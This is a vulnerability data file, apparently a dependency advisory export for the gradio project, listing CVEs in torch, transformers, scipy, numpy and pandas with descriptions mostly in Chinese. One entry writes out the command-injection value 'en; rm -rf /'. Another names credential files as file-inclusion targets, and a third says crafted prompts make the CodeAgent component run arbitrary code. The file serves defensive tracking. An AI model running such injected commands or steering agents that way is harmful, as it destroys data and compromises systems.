gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
gradio-app_gradio,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
gradio-app_gradio,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,torch,1.12.0,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,1.12.0,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,1.12.0,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,1.12.0,True,CVE-2024-5480,CWE-77,2024-06-06,PyTorch 是一个流行的开源深度学习框架，广泛用于研究和生产环境。torch.distributed.rpc框架用于在分布式训练场景中支持RPC操作。在2.2.2版本之前，该框架在RPC操作期间没有正确验证被调用的函数，这导致攻击者可以在多CPU RPC通信过程中，通过内置的Python函数（如eval）执行任意命令。,2,2
gradio-app_gradio,torch,1.12.0,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,1.12.0,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,1.12.0,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,1.12.0,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,1.12.0,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,1.12.0,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,1.12.0,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,1.12.0,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,1.12.0,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
